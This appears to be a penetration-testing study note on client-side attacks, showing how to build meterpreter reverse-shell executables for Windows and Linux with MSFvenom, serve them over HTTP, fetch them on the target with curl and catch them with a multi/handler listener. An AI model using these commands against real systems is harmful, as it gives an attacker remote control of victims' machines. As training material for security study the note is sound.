---
up: "[[Client-Side Attacks]]"
---

# Generating Payloads with MSFvenom

- A client side attack is an attack vector that involves coercing a client to execute a malicious payload on a their system that connects back to the attacker when executed
- These attacks typically utilize various social engineering techniques
- They take advantages of human vulnerabilities
- This attack vector involves the transfer and storage of a malicious payload on the client system, attackers need to be cognizant of AV detection

## MSFvenom

- a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers
- a combination or 2 tools: `msfpayload` & `msfencode`

## Demonstration

```bash
# list all payloads
msfvenom --list payloads
# focus on the meterpreter payloads
# staged
windows/meterpreter/bind_tcp
windows/x64/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
# non-staged payload
windows/x64/meterpreter_reverse_tcp
# output format 
msfvenom --list formats
```

```bash
# generate payload without encoding
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f exe > payload86.exe
# change architecture
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f exe > payload64.exe
```

Generate linux payload:

```bash
# x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f elf > ~/payload86
# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f elf > ~/payload64
```

Transfer executable to the victim:

```bash
$ sudo python -m http.server
```

Setup listener:

```bash
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <my_ip>
> set LPORT <port>
```

In target:

```bash
curl http://<ip>/payload.exe
```
